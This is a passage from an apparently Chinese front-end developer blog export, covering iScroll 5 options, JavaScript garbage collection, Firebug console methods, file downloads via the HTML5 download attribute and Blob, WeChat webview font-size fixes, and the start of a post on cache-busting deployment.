offsetY定义像素级的偏移量，所以你可以滚动到元素并且加上特别的偏移量。但并不仅限于此。如果把这两个参数设置为true，元素将会位于屏幕的中间。请参考例子 滚动到元素 example。easing参数和scrollTo方法里的一样。对齐iScroll能对齐到固定的位置和元素。options.snap最简单的对齐配置如下：123var myScroll = new IScroll(‘#wrapper‘, &#123;snap: true&#125;);这将按照页面容器的大小自动分割滚动条。snap属性也可以传递字符类型类型的值。这个值是滚动条将要对齐到的元素的选择器。比如下面：123var myScroll = new IScroll(‘#wrapper‘, &#123;snap: ‘li‘&#125;);这个示例中滚动条将会对齐到每一个LI标记的元素。下面将帮助你快速浏览iScroll提供的关于对齐的一系列有趣的方法。goToPage(x, y, time, easing)x 和 y呈现你想滚动到横向轴或者纵向轴的页面数。如果你需要在单个唯独上使用滚动条，只需要为你不需要的轴向传递0值。time属性是动画周期，easing属性是滚动到指定点使用的擦除功能类型。请参考高级功能中的option.bounceEasing。这两个属性都是可选项。myScroll.goToPage(10, 0, 1000)上面这个例子将在一秒内沿着横向滚动到第10页。next()prev()滚动到当前位置的下一页或者前一页。缩放为了使用缩放功能，你最好使用iscroll-zoom.js脚本。options.zoom此属性设置为true启用缩放功能。默认值：falseoptions.zoomMax最大缩放级数。默认值：4options.zoomMin最小缩放级数。默认值：1options.zoomStart初始的缩放级数。默认值：1options.wheelAction鼠标滚轮的动作可以设置为zoom，这样在滚动滚轮时缩放操作会代替原来的滚动操作。默认值：undefined（即：鼠标滚轮滚动）和前面的示例一样，一个好的缩放功能的配置如下：12345myScroll = new IScroll(‘#wrapper‘, &#123;zoom: true,mouseWheel: true,wheelAction: ‘zoom‘&#125;);缩放功能使用的CSS的转换功能。iScroll只能在支持此CSS功能的浏览器上执行。一些浏览器（特别是基于webkit的）采取的快照缩放区域就放在硬件合成层(比如当你申请转换)。该快照作为纹理的缩放区域,它几乎不能被更新。这意味着您的纹理将基于scale 1 进行缩放,将导致文本和图像模糊,清晰度低。一个简单的解决方案是使用实际分辨率双倍（或者三倍）装载内容，然后放到一个按照scale(0.5)比例缩小的div中。这种方法大多数情况下能适用。zoom(scale, x, y, time)一个有意思的的方法，能让你进行缩放编程。scale是缩放因子。x 和y是缩放关注点，即缩放的中心。如果没有指定，这个中心就是屏幕中心。time是毫秒级别的动画周期（可选项）。无限滚动iScroll集成智能缓存系统，允许处理的使用(重用)一群元素几乎无限数量的数据。无限滚动开发的早期阶段，尽管它可以被认为是稳定的，但它还没有准备好被广泛使用。请参考 无限滚动示例 并请提交你的建议和报告bug。高级选项下面这些选项主要针对核心开发人员。options.bindToWrappermove事件通常绑定到文档而不是滚动器容器（wrapper）。当你在滚动器容器（wrapper）外移动光标/手指，滚动条将不断滚动。这通常是你想要的,但是你也可以绑定事件转移到滚动器容器（wrapper）本身。这样做一旦指针离开了容器，滚动就会停止。默认值：falseoptions.bounceEasing擦除功能在弹跳动画过程中执行。有效的值为：‘quadratic‘, ‘circular‘, ‘back‘, ‘bounce‘, ‘elastic‘. 参见bounce easing demo，往下拽滚动条然后释放。bounceEasing比上面的示例更强大。你可以自定义一个消除的方式，比如：1234bounceEasing: &#123;style: ‘cubic-bezier(0,0,1,1)‘,fn: function (k) &#123; return k; &#125;&#125;上面这个示例将执行一个线性的擦出。style选项将在在每次动画执行时使用CSS转场执行。fn和requestAnimationFrame一起使用。如果一个擦出功能太复杂，不能由一个三次贝塞尔曲线展现，那么为style属性传递 ‘‘ （空字符串）。默认值：circular注意：bounce 和 elastic这两种方式不能被CSS转场执行。options.bounceTime弹跳动画的持续时间，使用毫秒级。默认值：600options.deceleration这个值可以改变改变动画的势头持续时间/速度。更高的数字使动画更短。你可以从0.01开始去体验，这个值和基本的值比较，基本上没有动能。默认值：0.0006options.mouseWheelSpeed设置鼠标滚轮滚动的速度值。默认值：20options.preventDefaultException调用preventDefault()方法时所有的异常将被触发，尽管preventDefault设置了值。这是一个强大的选项，如果你想为所有包含formfield样式名称的元素上应用preventDefault()方法，你可以设置为下面的值：1preventDefaultException: &#123; className: /(^|\s)formfield(\s|$)/ &#125;默认值：{ tagName: /^(INPUT|TEXTAREA|BUTTON|SELECT)$/ }.options.resizePolling当你改变窗口的大小iScroll重新计算元素的位置和尺寸。这可能是一个相当艰巨的任务。轮询设置为60毫秒。通过降低这个值你获得更好的视觉效果，但会占用更多的CPU资源。默认值是一个很好的折中。默认值：60刷新iScroll需要知道包装器和滚动器确切的尺寸，在iScroll初始化的时候进行计算，如果元素大小发生了变化，需要告诉iScroll DOM发生了变化。下面将提供调用refresh方法的正确时机。每次触摸DOM，浏览器渲染器重绘页面。一旦发生了重画我们可以安全地读新的DOM属性。重新绘制阶段不是瞬时发生的只是范围结束时触发。这就是为什么我们需要给渲染器刷新iScroll之前一点时间。为了确保javascript得到更新后的属性，应该像下面的例子这样使用刷新方法：12345678ajax(‘page.php‘, onCompletion);function onCompletion () &#123;// Update here your DOMsetTimeout(function () &#123;myScroll.refresh();&#125;, 0);&#125;;这里调用refresh()使用了零秒等待，如果你需要立即刷新iScroll边界就是如此使用。当然还有其他方法可以等待页面重绘，但零超时方式相当稳定。如果你有一个相当复杂的HTML结构，你应该给浏览器更多的执行事件，可以设置100到200毫秒的超时时间。这通常适用于所有任务必须在DOM上进行。通常给渲染器一些执行的时间。自定义事件Custom eventsiScroll还提供额一些你可以挂靠的有用的自定义事件。使用on(type, fn)方法注册事件。12myScroll = new IScroll(‘#wrapper‘);myScroll.on(‘scrollEnd‘, doSomething);上面的代码会在每次滚动停止是执行doSomething方法。可以挂靠的事件如下：beforeScrollStart，在用户触摸屏幕但还没有开始滚动时触发。scrollCancel，滚动初始化完成，但没有执行。scrollStart，开始滚动scroll，内容滚动时触发，只有在scroll-probe.js版本中有效，请参考onScroll event。scrollEnd，停止滚动时触发。flick，用户打开左/右。zoomStart，开始缩放。zoomEnd，缩放结束。onScroll事件，scroll事件在iScroll probe edition版本中有效（仅包含在iscroll-probe.js脚本文件中）。可以通过改变probeType选项值来改变scroll事件的触发时机options.probeType这个属性是调节在scroll事件触发中探针的活跃度或者频率。有效值有：1, 2, 3。数值越高表示更活跃的探测。探针活跃度越高对CPU的影响就越大。probeType: 1 对性能没有影响。scroll事件只有在滚动条不繁忙的时候触发。probeType: 2 除了在势能和反弹范围内，将在scroll事件周期内一直执行。这类似于原生的onScroll事件。probeType: 3 像素级的触发scroll事件。注意，此时滚动只关注requestAnimationFrame (即：useTransition:false).按键绑定你可以激活keyBindings选项来支持键盘控制。默认情况下iScroll监听方向键，上下翻页建，home/end键，但这些按键绑定完全可以自定义。你可以通过传递一个包含按键代码列表的对象来进行按键绑定。默认的按键值如下:12345678910keyBindings: &#123;pageUp: 33,pageDown: 34,end: 35,home: 36,left: 37,up: 38,right: 39,down: 40&#125;当然你也可以传递字符串进行按键绑定（例如：pageUp: ‘a‘）。只要你设置了对于的按键值，那么iScroll就会响应你的设置。滚动条信息iScroll存储了很多有用的信息，您可以使用它们来增强您的应用。你可能会发现有用的：myScroll.x/y，当前位置myScroll.directionX/Y，最后的方向 (-1 down/right, 0 still, 1 up/left)myScroll.currentPage，当前对齐捕获点下面是关于处理时间的代码示例：123456myScroll = new IScroll(‘#wrapper‘);myScroll.on(‘scrollEnd‘, function () &#123;if ( this.x &lt; -1000 ) &#123;// do something&#125;&#125;);如果 x 位置是低于-1000 像素滚轮停止时，上述执行某些代码。请注意我用这个产品而不是 myScroll，您可以使用两个当然，但 iScroll 传递本身作为这种情况下，当触发自定义事件的功能。销毁在不需要使用iScoll的时候调用iScroll实例的公共方法destroy()可以释放一些内存。12myScroll.destroy();myScroll = null;]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>IScroll5用法详解</tag>
        <tag>iscroll中文api</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScirpt的垃圾(garbage collection)回收机制]]></title>
    <url>%2F2016%2F07%2F11%2Fjavascirpt%E7%9A%84%E5%9E%83%E5%9C%BEgarbage-collection%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[一、垃圾回收机制—GCJavascript具有自动垃圾回收机制(GC:Garbage Collecation)，也就是说，执行环境会负责管理代码执行过程中使用的内存。原理：垃圾收集器会定期（周期性）找出那些不在继续使用的变量，然后释放其内存。JavaScript垃圾回收的机制很简单：找出不再使用的变量，然后释放掉其占用的内存，但是这个过程不是实时的，因为其开销比较大，所以垃圾回收器会按照固定的时间间隔周期性的执行。不再使用的变量也就是生命周期结束的变量，当然只可能是局部变量，全局变量的生命周期直至浏览器卸载页面才会结束。局部变量只在函数的执行过程中存在，而在这个过程中会为局部变量在栈或堆上分配相应的空间，以存储它们的值，然后在函数中使用这些变量，直至函数结束，而闭包中由于内部函数的原因，外部函数并不能算是结束。还是上代码说明吧：1234567891011function fn1() &#123; var obj = &#123;name: 'hanzichi', age: 10&#125;;&#125;function fn2() &#123; var obj = &#123;name:'hanzichi', age: 10&#125;; return obj;&#125;var a = fn1();var b = fn2();我们来看代码是如何执行的。首先定义了两个function，分别叫做fn1和fn2，当fn1被调用时，进入fn1的环境，会开辟一块内存存放对象{name: ‘hanzichi’, age: 10}，而当调用结束后，出了fn1的环境，那么该块内存会被js引擎中的垃圾回收器自动释放；在fn2被调用的过程中，返回的对象被全局变量b所指向，所以该块内存并不会被释放。这里问题就出现了：到底哪个变量是没有用的？所以垃圾收集器必须跟踪到底哪个变量没用，对于不再有用的变量打上标记，以备将来收回其内存。用于标记的无用变量的策略可能因实现而有所区别，通常情况下有两种实现方式：标记清除和引用计数。引用计数不太常用，标记清除较为常用二、标记清除js中最常用的垃圾回收方式就是标记清除。当变量进入环境时，例如，在函数中声明一个变量，就将这个变量标记为“进入环境”。从逻辑上讲，永远不能释放进入环境的变量所占用的内存，因为只要执行流进入相应的环境，就可能会用到它们。而当变量离开环境时，则将其标记为“离开环境”。12345function test()&#123; var a = 10 ; //被标记 ，进入环境 var b = 20 ; //被标记 ，进入环境&#125;test(); //执行完毕 之后 a、b又被标离开环境，被回收。垃圾回收器在运行的时候会给存储在内存中的所有变量都加上标记（当然，可以使用任何标记方式）。然后，它会去掉环境中的变量以及被环境中的变量引用的变量的标记（闭包）。而在此之后再被加上标记的变量将被视为准备删除的变量，原因是环境中的变量已经无法访问到这些变量了。最后，垃圾回收器完成内存清除工作，销毁那些带标记的值并回收它们所占用的内存空间。到目前为止，IE、Firefox、Opera、Chrome、Safari的js实现使用的都是标记清除的垃圾回收策略或类似的策略，只不过垃圾收集的时间间隔互不相同。三、引用计数引用计数的含义是跟踪记录每个值被引用的次数。当声明了一个变量并将一个引用类型值赋给该变量时，则这个值的引用次数就是1。如果同一个值又被赋给另一个变量，则该值的引用次数加1。相反，如果包含对这个值引用的变量又取得了另外一个值，则这个值的引用次数减1。当这个值的引用次数变成0时，则说明没有办法再访问这个值了，因而就可以将其占用的内存空间回收回来。这样，当垃圾回收器下次再运行时，它就会释放那些引用次数为0的值所占用的内存。123456function test()&#123; var a = &#123;&#125; ; //a的引用次数为0 var b = a ; //a的引用次数加1，为1 var c =a; //a的引用次数再加1，为2 var b =&#123;&#125;; //a的引用次数减1，为1&#125;Netscape Navigator3是最早使用引用计数策略的浏览器，但很快它就遇到一个严重的问题：循环引用。循环引用指的是对象A中包含一个指向对象B的指针，而对象B中也包含一个指向对象A的引用。12345678function fn() &#123; var a = &#123;&#125;; var b = &#123;&#125;; a.pro = b; b.pro = a;&#125;fn();以上代码a和b的引用次数都是2，fn()执行完毕后，两个对象都已经离开环境，在标记清除方式下是没有问题的，但是在引用计数策略下，因为a和b的引用次数不为0，所以不会被垃圾回收器回收内存，如果fn函数被大量调用，就会造成内存泄露。在IE7与IE8上，内存直线上升。我们知道，IE中有一部分对象并不是原生js对象。例如，其内存泄露DOM和BOM中的对象就是使用C++以COM对象的形式实现的，而COM对象的垃圾回收机制采用的就是引用计数策略。因此，即使IE的js引擎采用标记清除策略来实现，但js访问的COM对象依然是基于引用计数策略的。换句话说，只要在IE中涉及COM对象，就会存在循环引用的问题。1234var element = document.getElementById("some_element");var myObject = new Object();myObject.e = element;element.o = myObject;这个例子在一个DOM元素（element)与一个原生js对象（myObject)之间创建了循环引用。其中，变量myObject有一个名为element的属性指向element对象；而变量element也有一个属性名为o回指myObject。由于存在这个循环引用，即使例子中的DOM从页面中移除，它也永远不会被回收。看上面的例子，有同学回觉得太弱了，谁会做这样无聊的事情，其实我们是不是就在做:1234window.onload=function outerFunction()&#123; var obj = document.getElementById("element"); obj.onclick=function innerFunction()&#123;&#125;;&#125;;这段代码看起来没什么问题，但是obj引用了document.getElementById(“element”)，而document.getElementById(“element”)的onclick方法会引用外部环境中德变量，自然也包括obj，是不是很隐蔽啊。解决办法最简单的方式就是自己手工解除循环引用，比如刚才的函数可以这样12myObject.element = null;element.o = null;12345window.onload=function outerFunction()&#123; var obj = document.getElementById("element"); obj.onclick=function innerFunction()&#123;&#125;; obj=null;&#125;;将变量设置为null意味着切断变量与它此前引用的值之间的连接。当垃圾回收器下次运行时，就会删除这些值并回收它们占用的内存。要注意的是，IE9+并不存在循环引用导致Dom内存泄露问题，可能是微软做了优化，或者Dom的回收方式已经改变四、内存管理1、什么时候触发垃圾回收？垃圾回收器周期性运行，如果分配的内存非常多，那么回收工作也会很艰巨，确定垃圾回收时间间隔就变成了一个值得思考的问题。IE6的垃圾回收是根据内存分配量运行的，当环境中存在256个变量、4096个对象、64k的字符串任意一种情况的时候就会触发垃圾回收器工作，看起来很科学，不用按一段时间就调用一次，有时候会没必要，这样按需调用不是很好吗？但是如果环境中就是有这么多变量等一直存在，现在脚本如此复杂，很正常，那么结果就是垃圾回收器一直在工作，这样浏览器就没法儿玩儿了。微软在IE7中做了调整，触发条件不再是固定的，而是动态修改的，初始值和IE6相同，如果垃圾回收器回收的内存分配量低于程序占用内存的15%，说明大部分内存不可被回收，设的垃圾回收触发条件过于敏感，这时候把临街条件翻倍，如果回收的内存高于85%，说明大部分内存早就该清理了，这时候把触发条件置回。这样就使垃圾回收工作职能了很多2、合理的GC方案1）、Javascript引擎基础GC方案是（simple GC）：mark and sweep（标记清除），即：（1）遍历所有可访问的对象。（2）回收已不可访问的对象。2）、GC的缺陷和其他语言一样，javascript的GC策略也无法避免一个问题：GC时，停止响应其他操作，这是为了安全考虑。而Javascript的GC在100ms甚至以上，对一般的应用还好，但对于JS游戏，动画对连贯性要求比较高的应用，就麻烦了。这就是新引擎需要优化的点：避免GC造成的长时间停止响应。3）、GC优化策略David大叔主要介绍了2个优化方案，而这也是最主要的2个优化方案了：（1）分代回收（Generation GC）这个和Java回收策略思想是一致的。目的是通过区分“临时”与“持久”对象；多回收“临时对象”区（young generation），少回收“持久对象”区（tenured generation），减少每次需遍历的对象，从而减少每次GC的耗时。如图：这里需要补充的是：对于tenuredgeneration对象，有额外的开销：把它从young generation迁移到tenured generation，另外，如果被引用了，那引用的指向也需要修改。（2）增量GC这个方案的思想很简单，就是“每次处理一点，下次再处理一点，如此类推”。如图：这种方案，虽然耗时短，但中断较多，带来了上下文切换频繁的问题。因为每种方案都其适用场景和缺点，因此在实际应用中，会根据实际情况选择方案。比如：低 (对象/s) 比率时，中断执行GC的频率，simple GC更低些；如果大量对象都是长期“存活”，则分代处理优势也不大。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>garbage collection</tag>
        <tag>js的垃圾回收机制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[console命令详解，调试让console充满情怀]]></title>
    <url>%2F2016%2F07%2F10%2Fconsole%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%EF%BC%8C%E8%B0%83%E8%AF%95%E8%AE%A9console%E5%85%85%E6%BB%A1%E6%83%85%E6%80%80%2F</url>
    <content type="text"><![CDATA[控制台（Console）是Firebug的第一个面板，也是最重要的面板，主要作用是显示网页加载过程中产生各类信息。一、显示信息的命令Firebug内置一个console对象，提供5种方法，用来显示信息。最简单的方法是console.log()，可以用来取代alert()或document.write()。比如，在网页脚本中使用console.log(“Hello World”)，加载时控制台就会自动显示如下内容。1234console.info("这是info");console.debug("这是debug");console.warn("这是warn");console.error("这是error");加载时，控制台会显示如下内容。可以看到，不同性质的信息前面有不同的图标，并且每条信息后面都有超级链接，点击后跳转到网页源码的相应行。二、占位符console对象的上面5种方法，都可以使用printf风格的占位符。不过，占位符的种类比较少，只支持字符（%s）、整数（%d或%i）、浮点数（%f）和对象（%o）四种。比如，12console.log("%d年%d月%d日",2011,3,26);console.log("圆周率是%f",3.1415926);%o占位符，可以用来查看一个对象内部情况。比如，有这样一个对象：123var dog = &#123;&#125; ;dog.name = "大毛" ;dog.color = "黄色";然后，对它使用o%占位符。1console.log("%o",dog);三、分组显示如果信息太多，可以分组显示，用到的方法是console.group()和console.groupEnd()。12345678console.group("第一组信息");console.log("第一组第一条");console.log("第一组第二条");console.groupEnd();console.group("第二组信息");console.log("第二组第一条");console.log("第二组第二条");console.groupEnd();点击组标题，该组信息会折叠或展开。四、console.dir()console.dir()可以显示一个对象所有的属性和方法。比如，现在为第二节的dog对象，添加一个bark()方法。1dog.bark = function()&#123;alert("汪汪汪");&#125;;然后，显示该对象的内容，1console.dir(dog);五、console.dirxml()console.dirxml()用来显示网页的某个节点（node）所包含的html/xml代码。比如，先获取一个表格节点，1var table = document.getElementById("table1");然后，显示该节点包含的代码。1console.dirxml(table);六、console.assert()console.assert()用来判断一个表达式或变量是否为真。如果结果为否，则在控制台输出一条相应信息，并且抛出一个异常。比如，下面两个判断的结果都为否。1234var result = 0;console.assert( result );var year = 2000;console.assert(year == 2011 );七、console.trace()console.trace()用来追踪函数的调用轨迹。比如，有一个加法器函数。123function add(a,b)&#123; return a+b;&#125;我想知道这个函数是如何被调用的，在其中加入console.trace()方法就可以了。1234function add(a,b)&#123; console.trace(); return a+b;&#125;假定这个函数的调用代码如下：1234var x = add3(1,1);function add3(a,b)&#123;return add2(a,b);&#125;function add2(a,b)&#123;return add1(a,b);&#125;function add1(a,b)&#123;return add(a,b);&#125;运行后，会显示add()的调用轨迹，从上到下依次为add()、add1()、add2()、add3()。八、计时功能console.time()和console.timeEnd()，用来显示代码的运行时间。12345console.time("计时器一");for(var i=0;i&lt;1000;i++)&#123; for(var j=0;j&lt;1000;j++)&#123;&#125;&#125;console.timeEnd("计时器一");九、性能分析性能分析（Profiler）就是分析程序各个部分的运行时间，找出瓶颈所在，使用的方法是console.profile()。假定有一个函数Foo()，里面调用了另外两个函数funcA()和funcB()，其中funcA()调用10次，funcB()调用1次。123456789101112function Foo() &#123; for (var i = 0; i &lt; 10; i++) &#123; funcA(1000); &#125; funcB(10000); &#125; function funcA(count) &#123; for (var i = 0; i &lt; count; i++) &#123;&#125; &#125; function funcB(count) &#123; for (var i = 0; i &lt; count; i++) &#123;&#125; &#125;然后，就可以分析Foo()的运行性能了。123console.profile('性能分析器一');Foo();console.profileEnd();控制台会显示一张性能分析表，如下图。标题栏提示，一共运行了12个函数，共耗时2.656毫秒。其中funcA()运行10次，耗时1.391毫秒，最短运行时间0.123毫秒，最长0.284毫秒，平均0.139毫秒；funcB()运行1次，耗时1.229ms毫秒。除了使用console.profile()方法，firebug还提供了一个”概况”（Profiler）按钮。第一次点击该按钮，”性能分析”开始，你可以对网页进行某种操作（比如ajax操作），然后第二次点击该按钮，”性能分析”结束，该操作引发的所有运算就会进行性能分析。十、属性菜单控制台面板的名称后面，有一个倒三角，点击后会显示属性菜单。默认情况下，控制台只显示Javascript错误。如果选中Javascript警告、CSS错误、XML错误都送上，则相关的提示信息都会显示。这里比较有用的是”显示XMLHttpRequests”，也就是显示ajax请求。选中以后，网页的所有ajax请求，都会在控制台面板显示出来。比如，点击一个YUI示例，控制台就会告诉我们，它用ajax方式发出了一个GET请求，http请求和响应的头信息和内容主体，也都可以看到。]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>console命令详解</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何用 JavaScript 下载文件]]></title>
    <url>%2F2016%2F07%2F10%2F%E5%A6%82%E4%BD%95%E7%94%A8-javascript-%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[简介&emsp;&emsp;我们知道，下载文件是一个非常常见的需求，但由于浏览器的安全策略的限制，我们通常只能通过一个额外的页面，访问某个文件的 url 来实现下载功能，但是这种用户体验非常不好。幸好，HTML 5 里面为download 的属性，我们可以轻易的利用它来实现下载功能，再也不需要用以前的笨办法了。12345678910111213141516171819202122### 原理&amp;emsp;&amp;emsp;我们先看看 download 的使用方法：```&lt;a href=&quot;http://grycheng/grycheng.zip&quot; download=&quot;filename.zip&quot;&gt;Download file&lt;/a&gt;``看看上面的代码，只要为 ```&lt;a&gt;``` 标签添加 download 属性，我们点击这个链接的时候就会自动下载文件了~顺便说下，download 的属性值是可选的，它用来指定下载文件的文件名。像上面的例子中，我们下载到本地的文件名就会是 filename.zip 拉，如果不指定的话，它就会是 somefile.zip 这个名字拉！看到这里，你可能会说，坑爹啊，这明明是用 HTML 5 的新特性来实现下载文件嘛，说好的用 JavaScript 下载文件呢？事实上，用 JavaScript 来下载文件也是利用这一特性来实现的，我们的 JavaScript 代码不外乎就是：用 JavaScript 创建一个隐藏的 ```&lt;a&gt;``` 标签设置它的 href 属性设置它的 download 属性用 JavaScript 来触发这个它的 click 事件翻译成 JavaScript 代码就是：```javascriptvar a = document.createElement(&apos;a&apos;);var url = window.URL.createObjectURL(blob);var filename = &apos;what-you-want.txt&apos;;a.href = url;a.download = filename;a.click();window.URL.revokeObjectURL(url);window.URLwindow.URL 里面有两个方法：&emsp;&emsp;createObjectURL 用 blob 对象来创建一个 object URL(它是一个 DOMString)，我们可以用这个 object URL 来表示某个 blob 对象，这个 object URL 可以用在 href 和 src 之类的属性上。revokeObjectURL 释放由 createObjectURL 创建的 object URL，当该 object URL 不需要的时候，我们要主动调用这个方法来获取最佳性能和内存使用。知道了这两个方法之后，我们再回去看看上面的例子就很容易理解了吧！只是用 blob 对象来创建一条 URL，然后让URL，然后触发个点击事件，就可以下载文件了！1234567891011121314151617那么问题来了，blob 对象哪里来？## Blob 对象&amp;emsp;&amp;emsp;Blob 全称是 Binary large object，它表示一个类文件对象，可以用它来表示一个文件。根据 MDN 上面的说法，File API 也是基于 blob 来实现的。由于本文的主题是讲 JavaScript 下载文件，那我们构建 blob 的方式就是通过服务器返回的文件来创建 blob 拉！而最简单的方式就是用 fetch API 了，我们可以整合上面的例子：```javascriptfetch(&apos;http://somehost/somefile.zip&apos;).then(res =&gt; res.blob().then(blob =&gt; &#123;var a = document.createElement(&apos;a&apos;);var url = window.URL.createObjectURL(blob);var filename = &apos;myfile.zip&apos;;a.href = url;a.download = filename;a.click();window.URL.revokeObjectURL(url);&#125;))很简单对吧！你可能会问，何必这么麻烦呢？直接写成下面这样不就好了：&lt;a href=&quot;http://grycheng/grycheng.zip&quot; download=&quot;myfile.zip&quot;&gt;Download file&lt;/a&gt;限制一：不同浏览器对 blob 对象有不同的限制具体看看下面这个表格（出自 FileSaver.js）：限制二：构建完 blob 对象后才会转换成文件&emsp;&emsp;这一点限制对小文件(几十kb)可能没什么影响，但对稍微大一点的文件影响就很大了。试想，用户要下载一个 100mb 的文件，如果他点击了下载按钮之后没看到下载提示的话，他肯定会继续按，等他按了几次之后还没看到下载提示时，他就会抱怨我们的网站，然后离开了。然而事实上下载的的确确发生了，只是要等到下载完文件之后才能构建 blob 对象，再转化成文件。而且，用户再触发多几次下载就会造成一些资源上的浪费。因此，如果是要下载大文件的话，还是推荐直接创建一个 &lt;a&gt; 标签拉~写 html 也好，写 JavaScript 动态创建也好，用自己喜欢的方式去创建就好了。动态文件&emsp;&emsp;动态生成文件然后返回给客户端也是一个很常见的需求，譬如我们有时候需要做导出数据的功能，把数据库中的某些数据导出到 Excel 中，然后再返回客户端。这时候我们就不能简单的指定 href 属性，因为对应的 URL 并不存在。我们只能通过 JavaScript 对服务器发出一个请求，通知它去生成某个文件，然后把对应的 URL 返回给客户端。有没有感觉这个过程和上面「权限校验」一节很像？肯定拉，因为我们只是对 URL 做了一些预处理而已嘛~注意事项由于 download 属性是 HTML 5 的新特性，因此它不支持旧版本的浏览器。总结HTML 5 新的 download 特性真的很好用，结合 JavaScript 的动态能力我们可以很方便的做出复杂的下载功能~]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>如何用 JavaScript 下载文件</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[禁用微信 webview 调整字体大小]]></title>
    <url>%2F2016%2F07%2F10%2F%E7%A6%81%E7%94%A8%E5%BE%AE%E4%BF%A1-webview-%E8%B0%83%E6%95%B4%E5%AD%97%E4%BD%93%E5%A4%A7%E5%B0%8F%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;微信 webview 内置了调整字体大小的功能，对于网页的可用性来说是一个很实用的功能。一些网页的字体设置过小导致用户看不清文字，调整字体大小即可解决这个问题。&emsp;&emsp;但是对于一些追求显示效果的移动端页面来说，字体大小的调整可能会导致部分文字无法显示甚至是页面布局出错。如图，大众点评案例。解决方案&emsp;&emsp;微信的 iOS 版的调整字体大小使用的是通过给 body 设置 -webkit-text-size-adjust:120% 属性实现的，Android 则是用过 Java 调用 webview 的 API 设置字体大小。&emsp;&emsp;因为这两个系统实现调整字体大小的原理不同，所以需要两种方法来限制微信对网页字体大小的调整。iOS在 iOS 下，对网页的 body 元素设置 -webkit-text-size-adjust: 100% !important; 可以覆盖掉微信的样式。123body &#123; -webkit-text-size-adjust: 100% !important;&#125;Android&emsp;&emsp;在 Android 下，需要通过 WeixinJSBridge 对象将网页的字体大小设置为默认大小，并且重写设置字体大小的方法，让用户不能在该网页下设置字体大小。123456789101112131415161718192021(function() &#123; if (typeof WeixinJSBridge == "object" &amp;amp;&amp;amp; typeof WeixinJSBridge.invoke == "function") &#123; handleFontSize(); &#125; else &#123; if (document.addEventListener) &#123; document.addEventListener("WeixinJSBridgeReady", handleFontSize, false); &#125; else if (document.attachEvent) &#123; document.attachEvent("WeixinJSBridgeReady", handleFontSize); document.attachEvent("onWeixinJSBridgeReady", handleFontSize); &#125; &#125; function handleFontSize() &#123; // 设置网页字体为默认大小 WeixinJSBridge.invoke('setFontSizeCallback', &#123; 'fontSize' : 0 &#125;); // 重写设置网页字体大小的事件 WeixinJSBridge.on('menu:setfont', function() &#123; WeixinJSBridge.invoke('setFontSizeCallback', &#123; 'fontSize' : 0 &#125;); &#125;); &#125;&#125;)();注意：如果用户之前已经设置过了字体大小，访问网页时会先看到字体被放大后的效果再恢复正常，因为在 WeixinJSBridge 对象初始化完成之后才能通过 WeixinJSBridge 对象的方法设置为默认大小。Android 延迟生效问题录屏：测试用例http://demo.grycheng.com/case/resize_font.html总结由于实现原理的不同，目前的解决方案只在 iOS 上表现完美，Android 下仍然有延迟生效问题。如果你有更好的解决方案，欢迎在评论里补充。]]></content>
      <categories>
        <category>移动前端</category>
      </categories>
      <tags>
        <tag>禁用微信 webview 调整字体大小</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[最优前端开发代码部署方案(附实践方案)]]></title>
    <url>%2F2016%2F07%2F10%2F%E6%9C%80%E4%BC%98%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E9%83%A8%E7%BD%B2%E6%96%B9%E6%A1%88%E9%99%84%E5%AE%9E%E8%B7%B5%E6%96%B9%E6%A1%88%2F</url>
    <content type="text"><![CDATA[这是一个非常有趣的 非主流前端领域，这个领域要探索的是如何用工程手段解决前端开发和部署优化的综合问题，入行到现在一直在学习和实践中。在我的印象中，facebook是这个领域的鼻祖，有兴趣、有梯子的同学可以去看看facebook的页面源代码，体会一下什么叫工程化。接下来，我想从原理展开讲述，多图，较长，希望能有耐心看完。让我们返璞归真，从原始的前端开发讲起。上图是一个“可爱”的index.html页面和它的样式文件a.css，用文本编辑器写代码，无需编译，本地预览，确认OK，丢到服务器，等待用户访问。前端就是这么简单，好好玩啊，门槛好低啊，分分钟学会有木有！然后我们访问页面，看到效果，再查看一下网络请求，200！不错，太™完美了！那么，研发完成。。。。了么？等等，这还没完呢！对于大公司来说，那些变态的访问量和性能指标，将会让前端一点也不“好玩”。看看那个a.css的请求吧，如果每次用户访问页面都要加载，是不是很影响性能，很浪费带宽啊，我们希望最好这样：利用304，让浏览器使用本地缓存。但，这样也就够了吗？不成！304叫协商缓存，这玩意还是要和服务器通信一次，我们的优化级别是变态级，所以必须彻底灭掉这个请求，变成这样：强制浏览器使用本地缓存（cache-control/expires），不要和服务器通信。好了，请求方面的优化已经达到变态级别，那问题来了：你都不让浏览器发资源请求了，这缓存咋更新？很好，相信有人想到了办法：通过更新页面中引用的资源路径，让浏览器主动放弃缓存，加载新资源。好像这样：下次上线，把链接地址改成新的版本，就更新资源了不是。OK，问题解决了么？！当然没有！大公司的变态又来了，思考这种情况：页面引用了3个css，而某次上线只改了其中的a.css，如果所有链接都更新版本，就会导致b.css，c.css的缓存也失效，那岂不是又有浪费了？！重新开启变态模式，我们不难发现，要解决这种问题，必须让url的修改与文件内容关联，也就是说，只有文件内容变化，才会导致相应url的变更，从而实现文件级别的精确缓存控制。什么东西与文件内容相关呢？我们会很自然的联想到利用 数据摘要要算法 